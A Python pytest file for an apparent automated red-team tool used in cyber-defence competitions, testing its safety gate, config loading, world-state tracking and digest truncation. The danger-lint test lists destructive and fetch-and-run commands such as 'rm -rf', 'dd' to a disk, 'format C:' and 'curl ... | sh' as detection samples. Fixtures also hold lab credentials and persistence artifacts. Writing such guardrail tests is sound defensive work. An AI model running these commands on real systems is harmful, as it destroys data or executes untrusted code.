"""Core invariants: the gate, config loading, world state, digest truncation.

These four are the ones v1 got wrong in ways that cost real events, so they are
tested as behaviour, not as source text (no `inspect.getsource` — the plan bans
it, and v1's source-text tests passed while the feature was broken).
"""

import json
from pathlib import Path

import pytest

from tests.helpers import DEFAULT_COMP, base_cfg, make_ctx, make_intel
from tlaloc import config as config_mod
from tlaloc.errors import ConfigError, GuardrailError, StateError
from tlaloc.exec.gate import (DANGEROUS_POSIX, DANGEROUS_WINDOWS, Gate, danger_lint)
from tlaloc.state import digest as digest_mod
from tlaloc.state.world import World, artifact_key

FIXTURE = str(DEFAULT_COMP)


# --- the gate -----------------------------------------------------------------

def test_kill_switch_halts_per_command(tmp_path):
    ctx = make_ctx(tmp_path)
    ctx.gate.check_kill_switch()                      # absent: fine
    Path(ctx.cfg["run"]["kill_file"]).write_text("operator stop\n")
    with pytest.raises(GuardrailError) as excinfo:
        ctx.gate.check_kill_switch()
    assert "operator stop" in str(excinfo.value)


def test_ensure_target_only_team_subnets(tmp_path):
    ctx = make_ctx(tmp_path)
    ctx.gate.ensure_target("192.168.1.10")            # a team box: fine
    for out_of_scope in ("203.0.113.99", "10.200.0.5", "172.16.5.4", "192.168.9.10"):
        with pytest.raises(GuardrailError):
            ctx.gate.ensure_target(out_of_scope)


def test_blue_ips_extend_scope_explicitly(tmp_path):
    cfg = base_cfg(run={"blue_ips": ["192.168.7.7"]})
    ctx = make_ctx(tmp_path, cfg=cfg)
    ctx.gate.ensure_target("192.168.7.7")
    with pytest.raises(GuardrailError):
        ctx.gate.ensure_target("192.168.7.8")


def test_lint_uses_the_target_os_pattern_set():
    # v1's POSIX-only lint let every one of these through in front of cmd.exe
    for cmd in ("del /f /s /q C:\\Users\\*", "format C:",
                "Remove-Item -Recurse -Force C:\\inetpub",
                "Stop-Computer -Force", "diskpart /s clean.txt",
                "reg delete HKLM\\Software\\Foo /f", "cipher /w:C"):
        assert danger_lint(cmd, "windows") is not None, cmd
    # ...and the POSIX set still catches the POSIX ones
    for cmd in ("rm -rf /var/www", "dd if=/dev/zero of=/dev/sda",
                "shutdown -h now", "curl http://x/y | sh"):
        assert danger_lint(cmd, "linux") is not None, cmd
    assert danger_lint("systemctl stop nginx", "linux") is None
    assert danger_lint("Get-Service WinRM", "windows") is None


def test_command_caps_are_one_line_and_bounded(tmp_path):
    ctx = make_ctx(tmp_path)
    with pytest.raises(GuardrailError):
        ctx.gate.ensure_command("")
    with pytest.raises(GuardrailError):
        ctx.gate.ensure_command("echo a\necho b")
    with pytest.raises(GuardrailError):
        ctx.gate.ensure_command("echo " + "x" * 500)
    ctx.gate.ensure_command("id")


def test_ensure_retries_is_wired_not_dead(tmp_path):
    ctx = make_ctx(tmp_path)
    ctx.cfg["limits"]["max_retries_per_service"] = 2
    gate = Gate(ctx.cfg, ctx.intel.subnets())
    ctx.world.count_cred_try("192.168.1.10", "ubuntu")
    ctx.world.count_cred_try("192.168.1.10", "ubuntu")
    with pytest.raises(GuardrailError):
        gate.ensure_retries(ctx.world, "192.168.1.10", "ubuntu")


def test_pattern_sets_are_non_empty_and_named():
    assert DANGEROUS_POSIX and DANGEROUS_WINDOWS
    assert all(len(pair) == 2 for pair in DANGEROUS_POSIX + DANGEROUS_WINDOWS)


# --- config -------------------------------------------------------------------

def test_defaults_are_never_aliased():
    cfg_a = config_mod.load_config()
    cfg_a["red"]["caps"]["max_down"] = 99
    cfg_b = config_mod.load_config()
    assert cfg_b["red"]["caps"]["max_down"] == \
        config_mod.DEFAULTS["red"]["caps"]["max_down"]


def test_explicit_missing_config_is_a_hard_error():
    with pytest.raises(ConfigError):
        config_mod.load_config("/nonexistent/config.yaml")


def test_compfile_red_block_and_legacy_knobs(tmp_path):
    comp = tmp_path / "comp"
    comp.mkdir()
    (comp / "Compfile").write_text(
        "comp demo\nteams 2\nassume_breach 1\nassume_breach_depth 2\n"
        "red.duration_min 60\nred.caps.max_down 3\n")
    cfg = config_mod.load_config()
    cfg = config_mod.apply_compfile(cfg, comp)
    assert cfg["red"]["assume_breach"] == "light"      # legacy 1 -> light
    assert cfg["red"]["depth"] == 2
    assert cfg["red"]["duration_min"] == 60
    assert cfg["red"]["caps"]["max_down"] == 3


def test_compfile_yaml_pointer(tmp_path):
    comp = tmp_path / "comp"
    comp.mkdir()
    (comp / "red.yaml").write_text("ladder:\n  enabled: false\nassume_breach: full\n")
    (comp / "Compfile").write_text("comp demo\nred_yaml red.yaml\n")
    cfg = config_mod.apply_compfile(config_mod.load_config(), comp)
    assert cfg["red"]["ladder"]["enabled"] is False


def test_at_min_is_converted_against_this_events_duration():
    cfg = config_mod.load_config()
    cfg["red"]["duration_min"] = 60
    cfg["red"]["ladder"]["tiers"] = [
        {"name": "observe", "at_min": 0, "modes": ["recon"], "boxes_per_team": 0},
        {"name": "easy", "at_min": 30, "modes": ["stop"], "boxes_per_team": 1},
    ]
    config_mod.validate_config(cfg)
    assert cfg["red"]["ladder"]["tiers"][1]["at_pct"] == 0.5


def test_ladder_validation_rejects_bad_input():
    for bad in ({"assume_breach": "sometimes"}, {"duration_min": 0},
                {"depth": 9}):
        cfg = config_mod.load_config()
        cfg["red"].update(bad)
        with pytest.raises(ConfigError):
            config_mod.validate_config(cfg)
    cfg = config_mod.load_config()
    cfg["red"]["ladder"]["tiers"] = [
        {"name": "easy", "at_pct": 0.5, "modes": ["stop"]},
        {"name": "observe", "at_pct": 0.0, "modes": ["recon"]}]
    with pytest.raises(ConfigError):
        config_mod.validate_config(cfg)


def test_yaml_booleans_fold_back_into_the_assume_breach_enum(tmp_path):
    # `off` is YAML False; an operator writing it must not get "must be
    # full|light|off, got False"
    path = tmp_path / "cfg.yaml"
    path.write_text("red:\n  assume_breach: off\n")
    assert config_mod.load_config(str(path))["red"]["assume_breach"] == "off"
    path.write_text("red:\n  assume_breach: on\n")
    assert config_mod.load_config(str(path))["red"]["assume_breach"] == "full"
    path.write_text("red:\n  assume_breach: light\n")
    assert config_mod.load_config(str(path))["red"]["assume_breach"] == "light"


def test_env_overrides_use_the_allow_map(monkeypatch):
    monkeypatch.setenv("TLALOC_CLEF_URL", "http://127.0.0.1:9")
    monkeypatch.setenv("TLALOC_EVENT_MIN", "42")
    cfg = config_mod.load_config()
    assert cfg["clef"]["base_url"] == "http://127.0.0.1:9"
    assert cfg["red"]["duration_min"] == 42


# --- world state --------------------------------------------------------------

def test_world_refuses_another_comps_state(tmp_path):
    World(tmp_path, comp="comp-a")
    with pytest.raises(StateError):
        World(tmp_path, comp="comp-b")


def test_world_refuses_another_schema(tmp_path):
    path = tmp_path / "world.json"
    path.write_text(json.dumps({"schema": 1, "meta": {}, "targets": {}}))
    with pytest.raises(StateError):
        World(tmp_path, comp="comp-a")


def test_artifact_key_is_per_instance(tmp_path):
    ctx = make_ctx(tmp_path)
    ctx.world.add_artifact("192.168.1.10", "persist-systemd_unit",
                           "unit (alpha-helper.service) running", paths=["/x"])
    ctx.world.add_artifact("192.168.1.10", "persist-systemd_unit",
                           "unit (beta-helper.service) running", paths=["/y"])
    keys = {artifact_key(a) for a in ctx.world.artifacts()}
    assert len(keys) == 2                       # ip|kind alone would collapse them
    assert all(k.startswith("192.168.1.10|persist-systemd_unit|") for k in keys)


def test_restore_table_records_and_projects(tmp_path):
    ctx = make_ctx(tmp_path)
    ctx.world.add_restore("takedown", "192.168.1.10", "nginx",
                          ["systemctl unmask nginx", "systemctl start nginx"])
    from tlaloc import report
    table = report.restore_table(ctx.world)
    assert table[0]["effect"] == "takedown"
    assert table[0]["has_secrets"] is False
    assert len(report.restore_commands(ctx.world)) == 2


def test_dead_artifacts_are_remembered(tmp_path):
    ctx = make_ctx(tmp_path)
    ctx.world.add_artifact("192.168.1.10", "persist-cron", "cron (/etc/cron.d/x)")
    key = artifact_key(ctx.world.artifacts()[0])
    ctx.world.set_dead_artifacts([key])
    assert ctx.world.dead_artifacts() == {key}


def test_foothold_escalation_is_dropped_when_the_user_changes(tmp_path):
    ctx = make_ctx(tmp_path)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "pw", "user", escalation="sudo")
    ctx.world.add_foothold("192.168.1.10", "fieldtech", "pw2", "user")
    assert ctx.world.foothold("192.168.1.10")["escalation"] is None


# --- digest -------------------------------------------------------------------

def _frame(boxes=6, recent=6, roe=True):
    return {
        "t": "95/150", "phase": "surge", "cap": 5, "down": 3,
        "boxes": [{"id": f"web{i}", "team": (i % 2) + 1, "os": "l", "acc": "root",
                   "svc": [["nginx", "down"], ["ssh", "up"]],
                   "resp": {"restores_30m": i, "trend": "faster"}}
                  for i in range(boxes)],
        "recent": [f"stop_mask web{i} nginx ok" for i in range(recent)],
        "roe": {"win": "medium", "modes": ["stop", "stop_mask"]} if roe else {},
    }


def test_digest_keeps_the_roe_and_the_clock_always():
    digest, dropped = digest_mod.build(_frame(), budget_tokens=140)
    assert digest["roe"] and digest["t"] == "95/150" and digest["phase"] == "surge"
    assert digest["cap"] == 5
    assert dropped, "the cascade should have had to drop something"


def test_digest_truncation_order_is_the_documented_one():
    digest, dropped = digest_mod.build(_frame(), budget_tokens=90)
    order = [name for name in dropped]
    if "recent_tails" in order and "box_resp" in order:
        assert order.index("recent_tails") < order.index("box_resp")
    if "box_resp" in order and "boxes_per_team_cap" in order:
        assert order.index("box_resp") < order.index("boxes_per_team_cap")


def test_digest_is_small_enough_for_the_batch_and_flagged_when_not():
    digest, _ = digest_mod.build(_frame(), budget_tokens=400)
    assert digest_mod.estimate_tokens(digest) <= 400
    tiny, _ = digest_mod.build(_frame(boxes=40), budget_tokens=40)
    assert tiny.get("_over_budget") is True
    assert tiny["roe"]                       # still never dropped


def test_digest_is_deterministic_for_the_same_frame():
    a, _ = digest_mod.build(_frame())
    b, _ = digest_mod.build(_frame())
    assert digest_mod.dumps(a) == digest_mod.dumps(b)


# --- intel --------------------------------------------------------------------

def test_unmanaged_boxes_are_never_targets():
    intel = make_intel(FIXTURE)
    ips = [b["ip"] for b in intel.boxes()]
    assert "192.168.1.1" not in ips                       # the in-path firewall
    assert len(ips) == 6


def test_intel_loader_falls_back_to_blind(tmp_path):
    from tlaloc.intel import load_intel
    assert load_intel(tmp_path).source_name == "blind"
    assert load_intel(FIXTURE).source_name == "nakon"


def test_nakon_facts_are_ground_truth():
    intel = make_intel(FIXTURE)
    pairs = intel.candidate_pairs("192.168.1.10")
    assert ("ubuntu", "boxpw-1") in pairs
    assert (("root", "tlaloc-pam-anything") in pairs)     # pam_permit box
    assert "sudo-nopasswd" in intel.hints_for("192.168.1.10")["vulns"][0] or \
        intel.hints_for("192.168.1.10")["vulns"]
    services = intel.services_for("192.168.1.10")
    assert "nginx" in services and "ssh" in services
    ports = intel.port_checks_for("192.168.1.10")
    assert ports and ports[0]["port"] == 3306
